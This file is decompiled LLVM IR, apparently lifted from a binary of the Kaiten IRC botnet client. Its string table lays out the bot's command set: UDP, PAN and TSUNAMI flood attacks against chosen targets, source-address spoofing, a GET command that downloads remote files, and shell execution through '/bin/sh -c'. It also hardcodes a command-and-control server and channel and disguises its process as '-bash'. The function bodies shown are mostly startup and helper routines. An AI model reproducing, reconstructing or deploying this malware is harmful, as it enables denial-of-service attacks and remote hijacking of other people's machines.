source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208012081
@global_var_10010000.2 = global i32 -1
@global_var_1001000c.4 = global i32 0
@global_var_1001001c.5 = local_unnamed_addr global i32* @global_var_1001000c.4
@global_var_100104e4.7 = global i32 0
@global_var_100104fc.8 = global i32 0
@global_var_10010478.10 = local_unnamed_addr global i32 0
@global_var_1000ce70.11 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_1000053c.12 = constant i32 939524097
@global_var_10010468.13 = local_unnamed_addr global i32 0
@global_var_1001048c.14 = local_unnamed_addr global i32 0
@global_var_10010464.16 = local_unnamed_addr global i32 0
@global_var_1000ce90.17 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1000cea0.18 = constant i32 1912602624
@global_var_10010470.19 = local_unnamed_addr global i32 0
@global_var_1000cea4.20 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000d78.21 = constant [3 x i8] c"8`\00"
@global_var_1000cec0.22 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_10000f90.23 = constant [3 x i8] c"8`\00"
@global_var_10000f98.24 = constant [3 x i8] c"8`\00"
@global_var_1000cee4.25 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_10000fd8.26 = constant [3 x i8] c"8`\00"
@global_var_1000cf0c.27 = constant [8 x i8] c"http://\00"
@global_var_1000102c.28 = constant i32 1207959584
@global_var_1000104c.29 = constant i32 939524096
@global_var_1000cf14.30 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_10001124.31 = constant [3 x i8] c"8`\00"
@global_var_1000112c.32 = constant [3 x i8] c"9?\00"
@global_var_1000115c.33 = constant i32 1207959564
@global_var_1000cf3c.34 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_100011b8.35 = constant [3 x i8] c"8`\00"
@global_var_1000cf64.36 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_1000d078.37 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_1000d094.38 = constant [3 x i8] c"wb\00"
@global_var_1000d098.39 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10001344.40 = constant i32 1207959588
@global_var_1000d0a0.41 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_100014a8.42 = constant i32 1207959588
@global_var_100014fc.43 = constant [3 x i8] c"8`\00"
@global_var_1000d0b8.44 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_100015f4.45 = constant i32 1207959756
@global_var_1000d0d8.46 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_1000d108.47 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_1000d128.48 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_10001780.49 = constant i32 1207959652
@global_var_1000d140.50 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_100017bc.51 = constant i32 1207959592
@global_var_1000d178.52 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_1000d184.53 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_1000d1a0.54 = constant [9 x i8] c"Disabled\00"
@global_var_1000d1ac.55 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_1000d1c8.56 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_10001890.57 = constant i32 1207959752
@global_var_1000d1ec.58 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_100018c0.59 = constant i32 1207959704
@global_var_1000d20c.60 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_100018fc.61 = constant i32 1207959644
@global_var_10012b24.62 = global i32 0
@global_var_1000d234.63 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_1000d254.64 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_10001a04.65 = constant i32 1207959708
@global_var_1000d270.66 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_10001a34.67 = constant i32 1207959660
@global_var_1000d290.68 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_10001a78.69 = constant i32 1207959592
@global_var_1000d2ac.70 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_1000d2cc.71 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_1000d2ec.72 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_10001b58.73 = constant i32 1207959952
@global_var_1001046c.76 = global i32 0
@global_var_1000d33c.77 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_10001d88.78 = constant [3 x i8] c"8`\00"
@global_var_1000d360.79 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_10001e80.80 = constant [3 x i8] c"8`\00"
@global_var_1000d388.81 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_100020f0.82 = constant i32 939524096
@global_var_1000d3a4.83 = constant i32 2
@global_var_10002164.84 = constant i32 939524096
@global_var_1000d3f4.85 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_100021bc.86 = constant [3 x i8] c"8`\00"
@global_var_100021c4.87 = constant [3 x i8] c"8`\00"
@global_var_100021f0.88 = constant i32 939524096
@global_var_1000d41c.89 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_1000254c.90 = constant [3 x i8] c"9?\00"
@global_var_100025f0.91 = constant i32 939524096
@global_var_1000d434.92 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_10002698.93 = constant [3 x i8] c"8`\00"
@global_var_100026e8.94 = constant [3 x i8] c"8`\00"
@global_var_10002708.95 = constant i32 1207982677
@global_var_1000d458.96 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_10002980.97 = constant [3 x i8] c"9?\00"
@global_var_10002a3c.98 = constant [3 x i8] c"8`\00"
@global_var_10010480.106 = local_unnamed_addr global i32 0
@global_var_10010458.107 = local_unnamed_addr global i32 0
@global_var_10010488.143 = local_unnamed_addr global i32 0
@global_var_10010474.145 = local_unnamed_addr global i32 0
@global_var_1000dc24.158 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_10010484.159 = local_unnamed_addr global i32 0
@global_var_1000dc34.160 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1000dc44.161 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1000dc4c.162 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1000dc58.163 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_10003b84.164 = constant i32 1207959720
@global_var_10010410.168 = local_unnamed_addr global i32 4
@global_var_1000ce60.169 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_10010414.170 = global [16 x i8]* @global_var_1000ce60.169
@global_var_10003f14.171 = constant i32 1207959580
@global_var_10003f6c.172 = constant [3 x i8] c"8`\00"
@global_var_1000402c.173 = constant i32 1207959668
@global_var_10004060.174 = constant [3 x i8] c"8`\00"
@global_var_1000dcd8.175 = constant [6 x i8] c"-bash\00"
@global_var_10004120.176 = constant i32 939524097
@global_var_1001047c.177 = local_unnamed_addr global i32 0
@global_var_1000dce0.178 = constant [7 x i8] c"#Power\00"
@global_var_1000dce8.179 = constant [7 x i8] c"Powerk\00"
@global_var_1000dcf0.180 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10004264.181 = constant i32 1207959556
@global_var_1000dd1c.182 = constant i32 167772160
@global_var_1000464c.183 = constant i32 1207959568
@global_var_100046f4.184 = constant i32 939524096
@global_var_1000dcb8.185 = constant [4 x i8] c"352\00"
@global_var_100100a4.186 = global [4 x i8]* @global_var_1000dcb8.185
@global_var_1000dd20.187 = constant [6 x i8] c"ERROR\00"
@global_var_10004878.188 = constant i32 1207959564
@global_var_100104bc.193 = global i32 0
@global_var_10008c7c.194 = constant [3 x i8] c"8`\00"
@global_var_100100fc.195 = global i32 0
@global_var_10010494.196 = local_unnamed_addr global i32 0
@global_var_10010498.197 = local_unnamed_addr global i32 0
@global_var_10004c84.198 = constant i32 1207966525
@global_var_100108fc.199 = global i32 0
@global_var_10010490.200 = local_unnamed_addr global i32 0
@global_var_10004e78.201 = constant i32 939524118
@global_var_10004f50.202 = constant i32 939524096
@global_var_10004f74.203 = constant [3 x i8] c"9`\00"
@global_var_10004fe4.204 = constant i32 1207959864
@global_var_1000500c.206 = constant i32 1207975881
@global_var_1000e028.207 = constant [8 x i8] c"/bin/sh\00"
@global_var_1000e030.208 = constant [3 x i8] c"sh\00"
@global_var_1000e034.209 = constant [3 x i8] c"-c\00"
@global_var_10005094.210 = constant [3 x i8] c"8`\00"
@global_var_10005110.211 = constant i32 1207959580
@global_var_10005124.212 = constant i32 939524096
@global_var_100051ac.213 = constant i32 1207960120
@global_var_1001043c.214 = local_unnamed_addr global i32 2
@global_var_100100e4.215 = global i32 0
@global_var_10010438.216 = global i32* bitcast (i16* @global_var_10010114.190 to i32*)
@global_var_100053e0.217 = constant i32 1207959560
@global_var_10005430.218 = constant [3 x i8] c" c\00"
@global_var_1000544c.219 = constant [3 x i8] c" c\00"
@global_var_1000e03c.220 = constant i32 0
@global_var_100056e8.221 = constant i32 1207961092
@global_var_10005814.222 = constant i32 1207960768
@global_var_1000e070.223 = constant i32 269488136
@global_var_1000e054.224 = constant [6 x i8] c"(nil)\00"
@global_var_1000e05c.225 = constant [7 x i8] c"(null)\00"
@global_var_1000e064.226 = constant i32 721431808
@global_var_10005c70.227 = constant i32 939524096
@global_var_1000e0f0.228 = constant i32 65793
@global_var_1000e0d8.229 = constant i32 524293
@global_var_1001044c = external local_unnamed_addr global i32
@global_var_1000f09a.231 = constant i32 1
@global_var_1000e0d0.232 = constant [8 x i8] c" +0-#'I\00"
@global_var_1000e078.233 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1000e0b8.234 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1000e0ac.235 = constant i32 67343
@global_var_1000e0ab.236 = constant i32 50331911
@global_var_1000e09c.237 = constant i32 268435461
@global_var_1000e08c.238 = constant i32 520093701
@global_var_1000662c.239 = constant [3 x i8] c"8a\00"
@global_var_10006994.240 = constant i32 1207959708
@global_var_10006a3c.241 = constant i32 1207959612
@global_var_10006cac.242 = constant i32 939589631
@global_var_10006d60.243 = constant i32 939524118
@global_var_1000e10c.244 = constant [8 x i8] c"Success\00"
@global_var_1000e0fc.245 = constant [15 x i8] c"Unknown error \00"
@global_var_10010454.246 = local_unnamed_addr global i32* @global_var_1000f09a.231
@global_var_1001049c.247 = global i32 0
@global_var_10012ae0.248 = global i32 0
@global_var_10012914.249 = global i32 0
@global_var_100103e0.250 = global i32 0
@global_var_100104c8.251 = local_unnamed_addr global i32 0
@global_var_10012d4c.252 = global i32 0
@global_var_100079f4.253 = constant [3 x i8] c"8`\00"
@global_var_10007ad8.254 = constant i32 939524098
@global_var_10007b18.255 = constant [3 x i8] c"8`\00"
@global_var_10012af4.256 = global i32 0
@global_var_10010440 = external global i32
@global_var_100104ac.259 = local_unnamed_addr global i32 0
@global_var_10012d24.260 = global i32 0
@global_var_10007e24.261 = constant i32 939524108
@global_var_10007ebc.262 = constant [3 x i8] c"8`\00"
@global_var_100080c4.263 = constant i32 1207959640
@global_var_10008100.264 = constant i32 1207959580
@global_var_10010310.265 = global i32 0
@global_var_10010328 = external global i32
@global_var_10010348.267 = global i32 -1726662223
@global_var_10010330.268 = local_unnamed_addr global i32* @global_var_10010348.267
@global_var_1001032c.269 = global i32* @global_var_10010348.267
@global_var_1000ec68.270 = constant i32 0
@global_var_10008418.271 = constant i32 939524118
@global_var_1000882c.272 = constant i32 939524130
@global_var_100103c4.273 = global i32 0
@global_var_100104a0.274 = local_unnamed_addr global i32 0
@global_var_100088c0.275 = constant i32 1207960361
@global_var_100104a8.276 = local_unnamed_addr global i32 0
@global_var_100104b0.277 = local_unnamed_addr global i32 0
@global_var_100104b4.278 = local_unnamed_addr global i32 0
@global_var_1000ec90.279 = constant [10 x i8] c"/dev/null\00"
@global_var_100104b8.280 = local_unnamed_addr global i32 0
@global_var_100104a4.281 = local_unnamed_addr global i32 0
@global_var_10008f94.282 = constant i32 939524096
@global_var_10008fb0.283 = constant i32 939524096
@global_var_10008fd4.284 = constant i32 939524285
@global_var_100104dc.285 = local_unnamed_addr global i32 0
@global_var_100094bc.286 = constant i32 939524118
@global_var_100104c0.287 = global i32 0
@global_var_100095fc.288 = constant i32 939524180
@global_var_1000997c.289 = constant i32 939524105
@global_var_1000f2c8.290 = constant [4 x i8] c"inf\00"
@global_var_1000f2cb.292 = constant i32 4804166
@global_var_1000f2d8.293 = constant i32 771763200
@global_var_10012b0c.295 = global i32 0
@global_var_100104c4.296 = local_unnamed_addr global i32 0
@global_var_1000a930.298 = constant i32 1207960848
@global_var_100104cc.299 = local_unnamed_addr global i32 0
@global_var_1000f328.300 = constant i32 771751936
@global_var_10012d3c.301 = global i32 0
@global_var_1000aa20.302 = constant [3 x i8] c"8a\00"
@global_var_1000aa2c.303 = constant i32 939524097
@global_var_1000ab00.304 = constant i32 939524097
@global_var_1000abd4.305 = constant i32 939524097
@global_var_1000ac00.306 = constant i32 939524100
@global_var_1000ace0.307 = constant i32 1207959684
@global_var_1000ae5c.308 = constant i32 939589631
@global_var_1000f344.309 = constant i32 1912602624
@global_var_1000f330.310 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1000f348.311 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1000f360.312 = constant [11 x i8] c"nameserver\00"
@global_var_1000f36c.313 = constant [7 x i8] c"domain\00"
@global_var_1000f374.314 = constant [7 x i8] c"search\00"
@global_var_1000b194.315 = constant i32 1207959568
@global_var_1000b19c.316 = constant i32 939524099
@global_var_100103f8.317 = global i32 0
@global_var_1000b3ac.318 = constant i32 939524129
@global_var_100104d0.319 = local_unnamed_addr global i32 0
@global_var_1000b420.320 = constant [3 x i8] c"8`\00"
@global_var_1000b458.321 = constant i32 939524129
@global_var_100104d4.322 = local_unnamed_addr global i32 0
@global_var_100104d8.323 = local_unnamed_addr global i32 0
@global_var_1000b868.324 = constant i32 939524171
@global_var_1000b918.325 = constant i32 939524105
@global_var_1000bc98.326 = constant [3 x i8] c"8`\00"
@global_var_1000f390.327 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1000be90.328 = constant [3 x i8] c"9 \00"
@global_var_1000be9c.329 = constant i32 939524193
@global_var_1000bf04.331 = constant i32 939524101
@global_var_1000bff0.332 = constant i32 939524124
@global_var_1000c068.333 = constant i32 1207960116
@global_var_1000c080.334 = constant i32 939524105
@global_var_1000c1f8.335 = constant [3 x i8] c"9 \00"
@global_var_1000f3a4.336 = constant [3 x i8] c"%x\00"
@global_var_1000c284.337 = constant i32 939524124
@global_var_1000c2a8.338 = constant i32 939524193
@global_var_1000f3a8.339 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1000f3b4.340 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000c994.341 = constant i32 1207959560
@global_var_1000ca2c.342 = constant i32 939589631
@global_var_10010004.343 = global i32 0
@global_var_100104e0.3 = local_unnamed_addr global i8 0
@global_var_1001045c.9 = local_unnamed_addr global i8 0
@global_var_10010460.15 = external local_unnamed_addr global i8*
@global_var_10010463.165 = external local_unnamed_addr global i8*
@global_var_10010462.166 = external local_unnamed_addr global i8*
@global_var_10010461.167 = external global i8*
@global_var_10010114.190 = global i16 288
@global_var_10010164.191 = local_unnamed_addr global i16 272
@global_var_100103dc.297 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_10000094() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @function_10000168()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @function_1000cdd4(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @function_100000b8() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_100104e0.3, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_100104e0.3, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_100104e0.3, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @function_1000014c() local_unnamed_addr {
dec_label_pc_1000014c:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @function_10000168() local_unnamed_addr {
dec_label_pc_10000168:
  %v3_100001a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 16) to i32*), align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %dec_label_pc_10000168
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %dec_label_pc_10000168
  ret i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 16)
}

define i32 @function_100001d4() local_unnamed_addr {
dec_label_pc_100001d4:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @function_10008d68(i32 268452024, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 -12736), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @function_10000238(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10000238:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_1000025c = load i8, i8* %arg1, align 1
  %v3_1000026c = icmp eq i8 %v2_1000025c, 42
  br i1 %v3_1000026c, label %dec_label_pc_100002a4, label %dec_label_pc_10000274

dec_label_pc_10000274:                            ; preds = %dec_label_pc_10000238
  %v3_10000278 = icmp eq i8 %v2_1000025c, 63
  br i1 %v3_10000278, label %dec_label_pc_10000318, label %dec_label_pc_10000280

dec_label_pc_10000280:                            ; preds = %dec_label_pc_10000274
  %v3_10000284 = icmp eq i8 %v2_1000025c, 0
  br i1 %v3_10000284, label %dec_label_pc_10000290, label %dec_label_pc_10000374

dec_label_pc_10000290:                            ; preds = %dec_label_pc_10000280
  %v2_10000294 = load i8, i8* %tmp, align 1
  %v3_10000294 = zext i8 %v2_10000294 to i32
  br label %dec_label_pc_100003f8

dec_label_pc_100002a4:                            ; preds = %dec_label_pc_10000238
  %v2_100002a8 = add i32 %tmp8, 1
  store i32 268436152, i32* @lr, align 4
  %v5_100002b4 = inttoptr i32 %v2_100002a8 to i8*
  %v6_100002b4 = call i32 @function_10000238(i8* %v5_100002b4, i32 %arg2, i32 %tmp8)
  %v3_100002bc = icmp eq i32 %v6_100002b4, 0
  br i1 %v3_100002bc, label %dec_label_pc_10000304, label %dec_label_pc_100002c4

dec_label_pc_100002c4:                            ; preds = %dec_label_pc_100002a4
  %v2_100002c8 = load i8, i8* %tmp, align 1
  %v3_100002d0 = icmp eq i8 %v2_100002c8, 0
  br i1 %v3_100002d0, label %dec_label_pc_1000030c, label %dec_label_pc_100002d8

dec_label_pc_100002d8:                            ; preds = %dec_label_pc_100002c4
  %v2_100002dc = add i32 %arg2, 1
  store i32 268436204, i32* @lr, align 4
  %v6_100002e8 = call i32 @function_10000238(i8* nonnull %arg1, i32 %v2_100002dc, i32 %arg2)
  %v3_100002f0 = icmp eq i32 %v6_100002e8, 0
  br i1 %v3_100002f0, label %dec_label_pc_10000304, label %dec_label_pc_1000030c

dec_label_pc_10000304:                            ; preds = %dec_label_pc_100002d8, %dec_label_pc_100002a4
  br label %dec_label_pc_1000030c

dec_label_pc_1000030c:                            ; preds = %dec_label_pc_100002c4, %dec_label_pc_100002d8, %dec_label_pc_10000304
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10000304 ], [ 1, %dec_label_pc_100002d8 ], [ 1, %dec_label_pc_100002c4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000318:                            ; preds = %dec_label_pc_10000274
  %v2_1000031c = load i8, i8* %tmp, align 1
  %v3_10000324 = icmp eq i8 %v2_1000031c, 0
  br i1 %v3_10000324, label %dec_label_pc_10000368, label %dec_label_pc_1000032c

dec_label_pc_1000032c:                            ; preds = %dec_label_pc_10000318
  %v1_10000330 = add i32 %tmp8, 1
  %v2_10000338 = add i32 %arg2, 1
  store i32 268436296, i32* @lr, align 4
  %v4_10000344 = inttoptr i32 %v1_10000330 to i8*
  %v5_10000344 = call i32 @function_10000238(i8* %v4_10000344, i32 %v2_10000338, i32 %arg2)
  %v3_1000034c = icmp ne i32 %v5_10000344, 0
  %. = zext i1 %v3_1000034c to i32
  br label %dec_label_pc_10000368

dec_label_pc_10000368:                            ; preds = %dec_label_pc_1000032c, %dec_label_pc_10000318
  %storemerge2 = phi i32 [ 1, %dec_label_pc_10000318 ], [ %., %dec_label_pc_1000032c ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000374:                            ; preds = %dec_label_pc_10000280
  %v3_10000378 = load i8, i8* %arg1, align 1
  %v4_10000378 = zext i8 %v3_10000378 to i32
  store i32 268436364, i32* @lr, align 4
  %v3_10000388 = call i32 @function_10004b28(i32 %v4_10000378, i32 %tmp8)
  %v3_10000394 = load i8, i8* %tmp, align 1
  %v4_10000394 = zext i8 %v3_10000394 to i32
  store i32 268436392, i32* @lr, align 4
  %v3_100003a4 = call i32 @function_10004b28(i32 %v4_10000394, i32 %arg2)
  %v4_100003ac = icmp eq i32 %v3_10000388, %v3_100003a4
  br i1 %v4_100003ac, label %dec_label_pc_100003b4, label %dec_label_pc_100003f0

dec_label_pc_100003b4:                            ; preds = %dec_label_pc_10000374
  %v1_100003b8 = add i32 %tmp8, 1
  %v2_100003c0 = add i32 %arg2, 1
  store i32 268436432, i32* @lr, align 4
  %v4_100003cc = inttoptr i32 %v1_100003b8 to i8*
  %v5_100003cc = call i32 @function_10000238(i8* %v4_100003cc, i32 %v2_100003c0, i32 %arg2)
  %v3_100003d4 = icmp ne i32 %v5_100003cc, 0
  %.7 = zext i1 %v3_100003d4 to i32
  br label %dec_label_pc_100003f0

dec_label_pc_100003f0:                            ; preds = %dec_label_pc_100003b4, %dec_label_pc_10000374
  %storemerge = phi i32 [ 1, %dec_label_pc_10000374 ], [ %.7, %dec_label_pc_100003b4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_100003f8:                            ; preds = %dec_label_pc_10000368, %dec_label_pc_1000030c, %dec_label_pc_10000290, %dec_label_pc_100003f0
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_1000030c ], [ %storemerge2, %dec_label_pc_10000368 ], [ %v3_10000294, %dec_label_pc_10000290 ], [ %storemerge, %dec_label_pc_100003f0 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @function_10004b28, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_100003f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000030c, { 2, 1, 0 }
}

define i32 @function_1000041c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000041c:
  %stack_var_-136 = alloca i32, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32* @r3, align 4
  %v2_100004a0 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436652, i32* @lr, align 4
  %v4_100004a8 = call i32 @function_10004cac(i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32 %arg2, i32 %v2_100004a0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32* @r3, align 4
  %v0_100004b4 = call i32 @function_10006ed8()
  store i32 268436688, i32* @lr, align 4
  %v2_100004cc = call i32 @function_10004ae0(i32 %arg1, i32 ptrtoint (i32* @global_var_100104fc.8 to i32))
  ret i32 %v2_100004cc

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100104fc.8 to i32), { 1, 2, 0, 3 }
}

define i32 @function_100004f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100004f0:
  %v3_1000050c = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10000514 = icmp eq i8 %v3_1000050c, 1
  br i1 %v3_10000514, label %dec_label_pc_1000051c, label %dec_label_pc_10000548

dec_label_pc_1000051c:                            ; preds = %dec_label_pc_100004f0
  %v3_10000520 = load i32, i32* @global_var_10010478.10, align 4
  %v5_10000538 = call i32 @function_1000041c(i32 %v3_10000520, i32 ptrtoint ([30 x i8]* @global_var_1000ce70.11 to i32), i32 %arg1, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_1000064c

dec_label_pc_10000548:                            ; preds = %dec_label_pc_100004f0
  store i32 268436812, i32* @lr, align 4
  %v0_10000548 = call i32 @function_10004928()
